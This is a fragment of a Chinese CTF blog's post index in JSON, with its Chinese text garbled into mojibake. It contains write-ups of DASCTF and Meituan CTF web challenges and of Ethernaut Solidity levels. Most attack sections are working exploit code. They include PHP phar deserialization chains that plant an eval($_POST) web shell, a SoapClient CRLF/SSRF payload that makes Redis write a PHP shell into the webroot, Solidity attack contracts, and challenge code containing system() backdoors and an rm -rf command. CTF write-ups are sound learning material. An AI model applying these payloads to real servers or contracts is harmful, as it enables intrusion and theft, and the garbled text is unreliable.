rmfile(){ system('rm -rf /var/www/html/upload/*'); } public function check($type){ if (!in_array($type,$this-&gt;white)){ return false; } return true; }}#æ›´æ–°äº†ä¸€ä¸ªæ¶æ„åˆæœ‰è¶£çš„Testç±»class Test{ public $value; public function __destruct(){ chdir('./upload'); $this-&gt;backdoor(); } public function __wakeup(){ $this-&gt;value = &quot;Don't make dream.Wake up plz!&quot;; } public function __toString(){ $file = substr($_GET['file'],0,3); file_put_contents($file, &quot;Hack by $file !&quot;); return 'Unreachable! :)'; } public function backdoor(){ if(preg_match('/[A-Za-z0-9?$@]+/', $this-&gt;value)){ $this-&gt;value = 'nono~'; } system($this-&gt;value); }} å®˜æ–¹exp 123456789101112131415161718192021222324class User{public $username;}class Test{public $value;}$User = new User();$Test = new Test();$User-&gt;a = $Test;$User-&gt;username = &amp;$Test-&gt;value;echo serialize($User);#ç¬¬äºŒæ­¥ï¼Œéœ€è¦æŠŠnameæ”¹æˆ* /*// $Test-&gt;a = $User;// $User-&gt;username = $Test;// echo serialize($Test);#ç¬¬ä¸€æ­¥ï¼Œéœ€è¦æŠŠåå­—æ”¹æˆæ•°ç»„$phar = new \\Phar(&quot;h3ne1.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt; addFromString('test.txt','h3en1');//$phar-&gt;setMetadata($Test);ç¬¬ä¸€æ­¥$phar-&gt;setMetadata($User);$phar-&gt;stopBuffering(); å› ä¸ºç»™å®éªŒå®¤çš„æ–°ç”Ÿé…webé¶æœºçš„dockerç¯å¢ƒï¼Œå½“æ—¶å°±é¡ºæ‰‹çœ‹çœ‹æœ‰æ²¡æœ‰start.shæˆ–è€…flag.shæ–‡ä»¶ï¼Œç„¶åå°±è¿˜çœŸæ‰¾åˆ°äº† äº‹å®è¯æ˜ï¼Œdockerè¿è¡Œä¹‹åï¼Œè¦åˆ é™¤çš„ä¸åªæœ‰ç¯å¢ƒå˜é‡ï¼Œè¿˜æœ‰è¿è¡Œçš„shè„šæœ¬ï¼Œè°¨é˜²éœ²ç‰›å­ start.sh 1234567#!/bin/shecho $FLAG &gt; /ghjsdk_F149_H3re_asdasfcexport FLAG=no_flagFLAG=no_flagapache2-foregroundrm -rf /flag.shtail -f /dev/null ç›´æ¥éœ²ç‰›å­äº†å§ EasyLoveå½“æ—¶æ€¥ç€å¤ä¹ ï¼Œè¿™é¢˜æˆ‘æ²¡çœ‹äº†â€¦.å¯„ 123456789101112131415161718192021222324252627282930313233343536 &lt;?phphighlight_file(__FILE__);error_reporting(0);class swpu{ public $wllm; public $arsenetang; public $l61q4cheng; public $love; public function __construct($wllm,$arsenetang,$l61q4cheng,$love){ $this-&gt;wllm = $wllm; $this-&gt;arsenetang = $arsenetang; $this-&gt;l61q4cheng = $l61q4cheng; $this-&gt;love = $love; } public function newnewnew(){ $this-&gt;love = new $this-&gt;wllm($this-&gt;arsenetang,$this-&gt;l61q4cheng); } public function flag(){ $this-&gt;love-&gt;getflag(); } public function __destruct(){ $this-&gt;newnewnew(); $this-&gt;flag(); }}class hint{ public $hint; public function __destruct(){ echo file_get_contents($this-&gt; hint.'hint.php'); }}$hello = $_GET['hello'];$world = unserialize($hello); è¿™å›é“¾å­å¾ˆçŸ­ï¼Œå…ˆçœ‹hint 1234567&lt;?phpclass hint{public $hint=&quot;php://filter/read=convert.base64-encode/resource=&quot;;}$a = new hint();echo serialize($a);?&gt; è·å¾—è´¦å·å¯†ç  123&lt;?php$hint = &quot;My favorite database is Redis and My favorite day is 20220311&quot;;? å¾ˆæ˜æ˜¾ï¼Œåˆ©ç”¨SoapClientè¿›è¡Œssrfç„¶åæ‰“redis å¯„ï¼Œè¿˜æ˜¯ä¸ä¼šè¿™é‡Œä¹Ÿçœ‹ä¸€ä¸‹æ€ä¹ˆæ‰“redis è¿™é‡Œæ¯”è¾ƒæœ‰è¶£çš„æ˜¯ï¼Œå½“æˆ‘ä»¬åˆ©ç”¨ssrfå‘rediså‘èµ·httpè¯·æ±‚æ—¶ï¼Œä½ç‰ˆæœ¬çš„Redisä¼šå°†è¯·æ±‚å¤´çš„å†…å®¹ä½œä¸ºrediså‘½ä»¤è§£æï¼Œé‚£ä¹ˆåªè¦æˆ‘ä»¬é€šè¿‡CRLFæ§åˆ¶ä½è¯·æ±‚å¤´ï¼Œå†é…åˆSoapClientå‘èµ·è¯·æ±‚å³å¯ï¼Œæ•…expå¦‚ä¸‹ï¼š 12345678910111213141516171819202122&lt;?php$target='http://127.0.0.1:6379/';$poc0=&quot;AUTH 20220311&quot;;$poc=&quot;CONFIG SET dir /var/www/html&quot;;$poc1=&quot;SET x '&lt;?@eval(\\$_POST[1]);?&gt;'&quot;;$poc2=&quot;CONFIG SET dbfilename cmd.php&quot;;$poc3=&quot;SAVE&quot;;$a = array('location' =&gt; $target,'uri' =&gt;'hello^^'.$poc0.'^^'.$poc.'^^'.$poc1.'^^'.$poc2.'^^'.$poc3.'^^hello');$aaa = serialize($a);$aaa = str_replace('^^',&quot;\\r\\n&quot;,$aaa);$c=unserialize($aaa);class swpu{public $wllm = 'SoapClient';public $arsenetang = null;public $l61q4cheng;public $love;}$a=new swpu();$a-&gt;l61q4cheng=$c;echo urlencode(serialize($a));?&gt; ç¡®å®è¦å­¦å­¦Rediså’‹ç”¨äº†ï¼Œè¿™éƒ½çœ‹ä¸æ‡‚ BlogSystemè¿™æ˜¯ä¸ªå¥½é¢˜ï¼Œæˆ‘æ…¢æ…¢å“ä¸€å“å†æ¥åš,å¤ªå¤šæ¶‰åŠåˆ°æˆ‘çŸ¥è¯†ç›²åŒºçš„ä¸œè¥¿äº†","link":"/2022/10/28/das10%E5%A4%8D%E7%8E%B0/"},{"title":"ç¾å›¢CTFå†³èµ›å¤ç° mako","text":"å¤ªèœäº†ï¼Œè¢«å¤§ä½¬å¸¦è¿›å†³èµ›äº†,æœ€åå°±ç­¾ä¸ªåˆ° ç¯å¢ƒå¯†ç :1skr ä¸‹é¢éƒ¨åˆ†æ˜¯æˆ‘åœ¨æ¯”èµ›çš„æ—¶å€™æ€è€ƒè¿‡çš„ 1.å¼€å§‹é¡µé¢ä¸€è¿›æ¥ï¼Œååˆ†çš„æ¸…çˆ½ï¼Œæ¯›éƒ½æ²¡æœ‰ï¼Œå°±ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„ä¸œè¥¿ éšä¾¿ä¼ ç‚¹ä¸œè¥¿ï¼Œå‘ç°æ˜¯æ¥è€…ä¸æ‹’ï¼Œå•¥éƒ½èƒ½ä¼ ï¼Œä½†å•¥éƒ½å¹²ä¸äº†è®¿é—®1.phpåªä¼šå‡ºç°404not foundè¿™æ˜¯æœ€ä»¤äººå¼‚æˆ–çš„ä¸€ç‚¹ å› ä¸ºé¢˜ç›®ç»™äº†dockerï¼Œå°±æœ¬åœ°éƒ¨ç½²ä¸€ä¸ªç¯å¢ƒï¼Œå…ˆè¿›å»çœ‹çœ‹æ–‡ä»¶éƒ½å­˜åˆ°äº†å“ªé‡Œå¯ä»¥çœ‹è§ï¼Œæ–‡ä»¶å¹¶æ²¡æœ‰è¢«ä¸Šä¼ åˆ°/var/www/html/è¿™ä¸ªç›®å½•ä¸‹é¢ è€Œæ–‡ä»¶è¢«ä¸Šä¼ åˆ°äº†/var/www/html/mako/uploadsè¿™ä¸ªç›®å½•ä¸‹ å¯ä»¥è‚¯å®šçš„æ˜¯ï¼Œæ–‡ä»¶ä¸Šä¼ æ˜¯æ•´ä¸äº†æ´»äº† 2.å®¡è®¡é€šè¿‡æœç´¢å…³é”®è¯ï¼Œåœ¨mako/app/reources/views/home.tpl.phpé‡Œæ‰¾åˆ°åˆ°äº†é¦–é¡µçš„æºç  å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ç”¨æ¨¡ç‰ˆæ¸²æŸ“å‡ºæ¥çš„ä¸»é¡µ, å›¾ç‰‡éƒ½æ˜¯ä»¥base64çš„ç¼–ç å½¢å¼ä¼ é€’çš„ï¼Œæ²¡æ´»æ•´äº†ã€‚ è¿™å°±å¾ˆä»¤äººè‹¦æ¼ï¼Œæˆ‘å½“æ—¶å°è¯•äº†ä¸€ä¸‹ï¼Œä½¿ç”¨è½¯é“¾æ¥ ç›´æ¥å¯„äº†ï¼Œæ²¡æƒé™ï¼Œè¿™æ—¶å€™æ‰æƒ³èµ·æ¥å®¹å™¨ä¸€å¼€å§‹å†™äº†ä¸€ä¸ªè¯»å–flagçš„ç¨‹åº ç›®æ ‡ä¹Ÿæ˜ç¡®äº†ï¼Œè‚¯å®šå¾—æƒ³åŠæ³•æ‰§è¡ŒreadFlagï¼Œäºæ˜¯æˆ‘æœäº†å±é™©å‡½æ•°ï¼Œç„¶åæ˜¯ä¸€æ— æ‰€è·ï¼Œè¦ä¹ˆæ²¡è¿™ä¸ªå‡½æ•°ï¼Œè¦ä¹ˆæ ¹æœ¬æ— æ³•è§¦å‘ åšåˆ°è¿™é‡Œï¼Œæˆ‘å·²ç»æ²¡æœ‰æ€è·¯äº†ï¼Œå½“æ—¶æƒ³åˆ°äº†ååºåˆ—åŒ–ï¼Œä½†æ˜¯åªçŸ¥é“æœunseralizeï¼Œç»“æœæ˜¯æ¯›éƒ½æ²¡æœåˆ°ã€‚ æˆ‘ç»éªŒå¤ªå°‘äº†ï¼Œå½“æ—¶æ²¡æƒ³åˆ°ç”¨phar 3.å¤ç°åœ¨mako/app/controllers/ImagesController.phpæ–‡ä»¶ä¸­ 123456789public function editGet(ViewFactory $view): string { chdir('/var/www/mako/uploads'); $fileName = $this-&gt;request-&gt;getQuery()-&gt;get('filename'); $image = new Image($fileName, new ImageMagick()); $dimensions = $image-&gt;getDimensions(); $this-&gt;view-&gt;assign('fileName', $fileName); $this-&gt;view-&gt;assign('dimensions', $dimensions); return $view-&gt;render('edit');} å¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶åæ˜¯ä¸åšä»»ä½•è¿‡æ»¤çš„ è€Œåœ¨mako/vendo/mako/framework/src/mako/pixl/image.phpä¸­ 1234567891011121314151617public function __construct($image, ProcessorInterface $processor){ $this-&gt;image = $image; $this-&gt;processor = $processor; // Make sure that the image exists if(file_exists($this-&gt;image) === false) { throw new PixlException(vsprintf('The image [ %s ] does not exist.', [$this-&gt;image])); } // Set the image $this-&gt;processor-&gt;open($image);} ä½¿ç”¨äº†èƒ½è§¦å‘pharååºåˆ—åŒ–çš„file_existså‡½æ•° å…³é”®å‡½æ•°æ‰¾åˆ°äº†ï¼Œç°åœ¨æ‰¾é“¾å­å§ æœç´¢__destruct(),å¹²æ‰°é¡¹ä¸å¤šï¼Œå¯ä»¥ç›´æ¥å¼€æ’¸ å¥½å®¶ä¼™ï¼Œæˆ‘ç›´æ¥å¥½å®¶ä¼™ï¼Œä¸€æ¡é¾™æœåŠ¡äº†å±äºæ˜¯qwq 4.æ”»å‡»è¿™é‡Œæ¬ä¸€æ‰‹Arr3stY0uæˆ˜é˜Ÿçš„pocå§ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace mako\\file{class FileSystem{}}namespace mako\\session\\stores{ use mako\\file\\FileSystem;class File{ protected $fileSystem; protected $sessionPath; public function __construct(){ $this-&gt;fileSystem = new FileSystem(); $this-&gt;sessionPath = '/var/www/mako/public/'; }}}namespace mako\\session{use mako\\session\\stores\\File;class Session{ protected $autoCommit; protected $destroyed = false; protected $sessionId; protected $sessionData = []; protected $store; public function __construct(){ $this-&gt;autoCommit = true; $this-&gt;destroyed = false; $this-&gt;store = new File(); $this-&gt;sessionId = 'shell.php'; $this-&gt;sessionData = ['a'=&gt;'&lt;?php eval($_POST[1]);?&gt;']; }}}namespace { $exp = new mako\\session\\Session(); $phar = new Phar('test.phar',0,'test.phar'); $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); $phar-&gt;setMetadata($exp); $phar-&gt;addFromString('text.txt','test'); $phar-&gt;stopBuffering();}; ä¸Šä¼ æ–‡ä»¶getshellflag is here 5.æ€»ç»“åæ€ç»éªŒä¸è¶³ï¼Œåšé¢˜ä¸å¤Ÿï¼Œæ¬ ç»ƒ","link":"/2022/09/30/mt-ctf/"},{"title":"Ethernautåˆ·é¢˜è®°å½•","text":"è¸©å‘è®°å½•æ¥è‡ªè¿™é‡Œ å¯è§ä¿®é¥°ç¬¦publicprivateethernaut0.æ³¨æ„äº‹é¡¹ @openzeppelin/contracts/math/SafeMath.sol çš„åœ°å€å·²ç»è¿ç§»ï¼Œåšè¿™ä¸ªé¶åœºçš„æ—¶å€™å¾—è‡ªå·±æ‰‹åŠ¨æ”¹æˆ&quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;; ä»¥å¤ªåŠä¸»ç½‘å³å°†è¿›è¡Œåˆå¹¶ï¼ŒRinkebyæµ‹è¯•ç½‘ç»œå°†äºä¸€å¹´ååœæ­¢è¿è¡Œï¼Œåˆ°æ—¶å€™å°±ä¸çŸ¥é“è¿™ä¸ªé¶åœºæ˜¯å¦è¿˜ä¼šç»§ç»­è¿è¡Œ ä¸åŒç‰ˆæœ¬çš„solidityè¯­è¨€ç‰¹æ€§ä¸ä¸€æ ·ï¼Œå¯èƒ½ä¼šæœ‰å…¼å®¹é—®é¢˜ Rinkebyçš„æµ‹è¯•ä»¥å¤ªéš¾ä»¥å¤§é‡è·å–ï¼Œåšé¢˜ä¸è¦ä¸€è‚¡è„‘æŠŠä»¥å¤ªå…¨å¡è¿›å»äº† 1.Falloutæè¿°12345678910111213è¿™å¾ˆç™½ç—´æ˜¯å§? çœŸå®ä¸–ç•Œçš„åˆçº¦å¿…é¡»å®‰å…¨çš„å¤š, éš¾ä»¥å…¥ä¾µçš„å¤š, å¯¹å§?å®é™…ä¸Š... ä¹Ÿæœªå¿….Rubixiçš„æ•…äº‹åœ¨ä»¥å¤ªåŠç”Ÿæ€ä¸­éå¸¸çŸ¥å. è¿™ä¸ªå…¬å¸æŠŠåå­—ä» 'Dynamic Pyramid' æ”¹æˆ 'Rubixi' ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåœ°, ä»–ä»¬æ²¡æœ‰æŠŠåˆçº¦çš„ constructor æ–¹æ³•ä¹Ÿä¸€èµ·æ›´å:contract Rubixi { address private owner; function DynamicPyramid() { owner = msg.sender; } function collectAllFees() { owner.transfer(this.balance) } ...è¿™è®©æ”»å‡»è€…å¯ä»¥è°ƒç”¨æ—§åˆçº¦çš„constructor ç„¶åè·å¾—åˆçº¦çš„æ§åˆ¶æƒ, ç„¶åå†è·å¾—ä¸€äº›èµ„äº§. æ˜¯çš„. è¿™äº›é‡å¤§é”™è¯¯åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œæ˜¯æœ‰å¯èƒ½çš„. åˆçº¦ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; }} è§£:æ‰”åˆ°remixé‡Œé¢è°ƒç”¨Fal1out()å‡½æ•°å°±è¡Œäº† 2.Coin Flipæè¿°è¿™æ˜¯ä¸€ä¸ªæ·ç¡¬å¸çš„æ¸¸æˆï¼Œä½ éœ€è¦è¿ç»­çš„çŒœå¯¹ç»“æœã€‚å®Œæˆè¿™ä¸€å…³ï¼Œä½ éœ€è¦é€šè¿‡ä½ çš„è¶…èƒ½åŠ›æ¥è¿ç»­çŒœå¯¹åæ¬¡ã€‚ åˆçº¦ä»£ç 123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } }} è§£:ä»¥å¤ªåŠç½‘ç»œç»å…¸éš¾é¢˜:ç†µçš„äº§ç”Ÿ ä½¿ç”¨åŒºå—å“ˆå¸Œäº§ç”Ÿçš„éšæœºæ•°å¾ˆå®¹æ˜“è¢«é¢„æµ‹(åªéœ€è¦å’Œå®ƒåœ¨åŒä¸€ä¸ªåŒºå—ä¸Šå°±è¡Œäº†)ï¼Œåªéœ€è¦å†™ä¸ªä¸­ç»§åˆçº¦æ‰“è¿›å»å°±è¡Œäº†ï¼ˆåŸæ¥çš„åˆçº¦åŸºç¡€ä¹‹ä¸Šæ”¹ä¸€ç‚¹ç‚¹å°±è¡Œäº†ï¼‰ 1234567891011121314function exp() public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; c = CoinFlip(targetAddress); c.flip(side);} æ³¨æ„ï¼šåœ¨æŸäº›é¢„æµ‹éšæœºæ•°çš„é¢˜ç›®ä¸­ä¼šè¿”è¿˜ä»¥å¤ªï¼Œç»å¸¸å‡ºç°åˆçº¦é€»è¾‘æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†æ˜¯å°±æ˜¯è¿è¡Œå‡ºé”™çš„é—®é¢˜ã€‚ å½“åˆçº¦æ”¶åˆ°ä¸€ä¸ªcalldataä¸ºç©ºçš„callæ—¶ï¼Œreceiveå‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚è¿™ä¸ªå‡½æ•°ä¼šåœ¨æ‰§è¡Œä¸€äº›ä»¥å¤ªå¸è½¬è´¦æ“ä½œæ—¶è¢«æ‰§è¡Œï¼Œå¸¸è§çš„ä»¥å¤ªå¸è½¬è´¦æ“ä½œåŒ…æ‹¬.send()ã€.transfer()å‡½æ•°å‘èµ·çš„è½¬è´¦ã€‚å¦‚æœæ²¡æœ‰receiveå‡½æ•°å­˜åœ¨ï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªpayableå±æ€§çš„fallbackå‡½æ•°çš„è¯ï¼Œè¿™ä¸ªfallbackå‡½æ•°ä¼šåœ¨ä¸€æ¬¡ä»¥å¤ªå¸è½¬è´¦ä¸­è¢«è°ƒç”¨ã€‚å¦‚æœä¸€ä¸ªåˆçº¦æ—¢æ²¡æœ‰receiveå‡½æ•°ä¹Ÿæ²¡æœ‰payableå±æ€§çš„fallbackå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªåˆçº¦ä¸èƒ½é€šè¿‡å¸¸è§„çš„äº¤æ˜“æ¥æ¥æ”¶ä»¥å¤ªå¸ï¼Œå¹¶ä¸”ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚ 3.Telephoneåˆçº¦ä»£ç 12345678910111213141516pragma solidity ^0.6.0;contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } }} è§£:tx.orginæŒ‡çš„æ˜¯äº¤æ˜“çš„å‘èµ·æ–¹ï¼Œmsg.senderæ˜¯ç›´æ¥è°ƒç”¨çš„ä¸€æ–¹ï¼Œæ‰€ä»¥ç›´æ¥å†™åˆçº¦è°ƒç”¨è¿™ä¸ªå‡½æ•°å°±è¡Œäº† 123456789101112131415161718192021pragma solidity ^0.4.11;interface Telephone { function changeOwner(address _owner) external;}contract exploit { address targetAddr; Telephone t; address myaddr; function setInstance(address _targetAddr,address _myaddr) public { targetAddr=_targetAddr; myaddr= _myaddr; } function exp () public { t = Telephone(targetAddr); t.changeOwner(myaddr); }} 4.Tokenåˆçº¦ä»£ç 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token { mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; }} è§£:å¾ˆeasy æº¢å‡ºå°±å®Œäº‹äº†è½¬ä¸ª 115792089237316195423570985008687907853269984665640564039457584007913129639935å°±è¡Œäº† 5. Delegationåˆçº¦ä»£ç 123456789101112131415161718192021222324252627282930313233// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; }}contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } }} è§£ï¼šè€ç”Ÿå¸¸è°ˆï¼Œ delegatecallç›¸å½“äºæ˜¯å»ç›®æ ‡åˆçº¦é‚£å—æŠŠç›¸å…³çš„å‡½æ•°ä»£ç å¤åˆ¶è¿‡æ¥è¿è¡Œï¼Œè€Œåœ¨solidityæ˜¯ä¸ªç¼–è¯‘å‹è¯­è¨€ï¼Œä¸”å­˜å‚¨ä½¿ç”¨çš„æ˜¯slot[]è¿™ä¸ªå¤§æ•°ç»„ï¼Œå˜é‡æ˜¯å†™æ­»åœ¨ä»£ç é‡Œé¢çš„ï¼Œä¸€æ—¦ç›®æ ‡åˆçº¦çš„å˜é‡ç¯å¢ƒå’Œå½“å‰åˆçº¦çš„å˜é‡ç¯å¢ƒä¸ä¸€æ ·ï¼Œå°±å‡ºå¤§äº‹ï¼Œè¿™é¢˜éƒ½åšçƒ‚äº†ï¼Œæ‡’å¾—å†™äº† 6.Forceæè¿°123æœ‰äº›åˆçº¦å°±æ˜¯æ‹’ç»ä½ çš„ä»˜æ¬¾,å°±æ˜¯è¿™ä¹ˆä»»æ€§ Â¯\\_(ãƒ„)_/Â¯è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ä½¿åˆçº¦çš„ä½™é¢å¤§äº0 åˆçº¦ä»£ç 123456789101112// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =Ã¸= / (______)__m_m)*/} è§£ï¼šåœ¨Solidityé‡Œé¢ï¼Œæœ‰ä¸ªå¾ˆç‰¹æ®Šçš„è‡ªæ¯å‡½æ•° selfdestruct(addr);éšä¾¿å†™ä¸ªåˆçº¦ï¼Œå¡è¿›å»ä¸€ä¸ªselfdestructå‡½æ•°ï¼Œç„¶åæŒ‡å‘é¢˜ç›® 7.Vaultåˆçº¦ä»£ç 123456789101112131415161718// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } }} è§£ç›´æ¥getStorageAtå°±è¡Œäº†ï¼Œç›´æ¥çœ‹ 8.Kingåˆçº¦ä»£ç 12345678910111213141516171819202122232425262728// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender; prize = msg.value; } receive() external payable { require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address payable) { return king; }} è§£ï¼š1234567891011contract Attack { constructor(address payable target) public payable{ require(msg.value == 0.15 ether,&quot;Not enough!&quot;); target.call.gas(1000000).value(0.15 ether)(&quot;&quot;); } receive() external payable { revert(); }} å½“submité¢˜ç›®æ‰“ç®—å›æ”¶â€œç‹æƒâ€æ—¶ï¼Œå®ƒè¿è¡Œåˆ°king.transfer(msg.value);è¿™ä¸€è¡Œæ—¶ï¼Œç”±äºkingå°±æ˜¯æˆ‘ä»¬åˆçº¦çš„åœ°å€ï¼Œè€Œæˆ‘ä»¬åˆçº¦çš„receiveå‡½æ•°ä¼šæ‰§è¡Œrevertï¼Œå› æ­¤å®ƒä¼šå¡åœ¨è¿™ä¸ªçŠ¶æ€æ— æ³•æ‰§è¡Œï¼Œä»è€Œæ— æ³•å–å›ç‹æƒã€‚ è¿™ä¸ªæ¼æ´åœ¨å®é™…åˆçº¦ä¸­è¢«ç”¨revertæ¥æ‰§è¡ŒDDosï¼Œè®©ç¨‹åºå¡åœ¨æŸä¸ªçŠ¶æ€æ— æ³•è¿è¡Œã€‚ éº»äº†ï¼Œåœ¨å†™æ”»å‡»åˆçº¦çš„æ—¶å€™åˆè¸©å‘é‡Œäº†https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/ transfer:è¦æ±‚æ¥æ”¶çš„æ™ºèƒ½åˆçº¦ä¸­å¿…é¡»æœ‰ä¸€ä¸ªfallbackæˆ–è€…receiveå‡½æ•°ï¼Œå¦åˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯(error)ï¼Œå¹¶ä¸”revertï¼ˆä¹Ÿå°±æ˜¯å›æ»šåˆ°äº¤æ˜“å‰çš„çŠ¶æ€ï¼‰ã€‚è€Œä¸”æœ‰å•ç¬”äº¤æ˜“ä¸­çš„æ“ä½œæ€»gasä¸èƒ½è¶…è¿‡2300çš„é™åˆ¶ã€‚transferå‡½æ•°ä¼šåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µæŠ›å‡ºé”™è¯¯ï¼š ä»˜æ¬¾æ–¹åˆçº¦çš„ä½™é¢ä¸è¶³ï¼Œå°äºæ‰€è¦å‘é€çš„value æ¥æ”¶æ–¹åˆçº¦æ‹’ç»æ¥æ”¶æ”¯ä»˜ send:å’Œtransferå‡½æ•°çš„å·¥ä½œæ–¹å¼åŸºæœ¬ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äºï¼Œå½“å‡ºç°ä¸Šè¿°ä¸¤ç§äº¤æ˜“å¤±è´¥çš„æƒ…å†µæ—¶ï¼Œsendçš„è¿”å›ç»“æœæ˜¯ä¸€ä¸ªbooleanå€¼ï¼Œè€Œä¸ä¼šæ‰§è¡Œrevertå›æ»šã€‚ call: callå‡½æ•°å’Œä¸Šé¢æœ€å¤§çš„åŒºåˆ«åœ¨äºï¼Œå®ƒæ²¡æœ‰gasçš„é™åˆ¶ï¼Œä½¿ç”¨callæ—¶EVMå°†æ‰€æœ‰gasè½¬ç§»åˆ°æ¥æ”¶åˆçº¦ä¸Šï¼Œå½¢å¼å¦‚ä¸‹: (bool success, bytes memory data) = receivingAddress.call{value: 100}(â€œâ€); å°†å‚æ•°è®¾ç½®ä¸ºç©ºä¼šè§¦å‘æ¥æ”¶åˆçº¦çš„fallbackå‡½æ•°ï¼Œä½¿ç”¨callåŒæ ·ä¹Ÿå¯ä»¥è°ƒç”¨æœ¬åˆçº¦å†…çš„å‡½æ•°ï¼Œå½¢å¼å¦‚ä¸‹ (bool sent, bytes memory data) = _to.call{gas :10000, value: msg.value}(byte4(keccack256(â€œfunction_name(uint256)â€,args))); 9.Re-entrancyåˆçº¦ä»£ç 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Reentrance { using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) { (bool result,) = msg.sender.call{value:_amount}(&quot;&quot;); if(result) { _amount; } balances[msg.sender] -= _amount; } } receive() external payable {}} è§£åˆçº¦åœ¨è¿›è¡Œæå¸æ—¶ï¼Œä½¿ç”¨ require ä¾æ¬¡åˆ¤æ–­æå¸è´¦æˆ·æ˜¯å¦æ‹¥æœ‰ç›¸åº”çš„èµ„äº§ï¼Œéšåä½¿ç”¨ msg.sender.call.value(amount)() æ¥å‘é€ Etherï¼Œå¤„ç†å®Œæˆåç›¸åº”ä¿®æ”¹ç”¨æˆ·èµ„äº§æ•°æ®ã€‚ é¦–å…ˆï¼Œä½¿ç”¨callè¿›è¡Œè½¬è´¦æ˜¯ä¸ªæ¯”è¾ƒå±é™©çš„æ“ä½œï¼Œå› ä¸ºcallä¼šå°†å½“å‰å‰©ä¸‹çš„gasä¸€å¹¶å‘è¿‡å»æ‰§è¡Œ","link":"/2022/10/04/solidity/"},{"title":"SQLæ³¨å…¥å¤‡å¿˜å½•","text":"æœ€è¿‘åœ¨ç”¨sql-libå­¦sqlæ³¨å…¥ï¼Œé›¶é›¶æ•£æ•£çš„ç¬”è®°æ•´äº†ä¸€å¤§å 